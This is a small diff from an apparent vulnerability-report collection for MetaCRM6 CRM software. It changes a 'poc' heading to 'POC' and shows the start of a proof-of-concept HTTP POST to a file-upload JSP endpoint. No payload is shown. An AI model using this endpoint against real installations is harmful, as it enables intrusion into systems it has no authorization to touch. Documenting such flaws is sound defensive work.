@@ -9,7 +9,7 @@ product="美特软件-MetaCRM6"
 ```
 
 
-## poc
+## POC
 ```
 POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
 Host: x.x.x.x
